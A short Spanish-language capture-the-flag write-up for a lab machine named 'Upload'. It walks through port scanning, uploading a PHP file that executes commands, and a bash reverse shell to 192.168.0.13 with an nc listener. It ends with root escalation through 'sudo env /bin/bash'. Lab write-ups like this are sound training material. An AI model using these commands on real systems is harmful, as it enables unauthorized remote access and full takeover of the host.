# Upload

Tags: [[_webFuzzing]],[[_webExploitation]],[[_sudoersAbusing]]

Empezamos creando los directorios de trabajo.
Le hacemos un ping a la máquina.
Empezamos el escaneo con NMAP.

Hacemos un escaneo exhaustivo a los puertos.
En este caso solo es el puerto 80.

Vemos la versión de apache he investigamos el codename, el cual posiblemente sea Ubuntu Jammy.

El escaneo con NMAP dice que el encabezado de la web es de subir archivos.
En whatweb dice eso mismo.

Entremos a verla.

Es para subir un archivo, podemos pensar en una extensión .php, se ve que lo interpreta.

Empecemos con una prueba, también tengamos en cuenta que se deben almacenar en algún lado.

Subí un .txt, pero claro, no sé dónde se almacena, podemos pensar en fuzzear.

Se ve que hay una ruta "uploads".
Tiene directory listing.
Puedo ver el contenido de mi archivo .txt

Ahora hagamos uno con contenido php para ver si lo interpreta.

Y efectivamente, puedo ejecutar comandos en la máquina.

Gano acceso a la máquina.
Me pongo en escucha
nc -nlvp 443

En la web
cmd?=bash -c "bash -i >& /dev/tcp/192.168.0.13/443 0>&1"
URL-Encodeamos los '&'.

Ganamos acceso y hacemos el tratamiento de la tty.

Estamos como www-data.

Empezamos a anlizar todo.
Podemos ejecutar como root un binario.
Parece que las variables de entorno las ajusta.

Investiguemos en GTFOBINS

Si hago
sudo env /bin/bash
Me la spawnea como root.

De esta manera finalizamos.


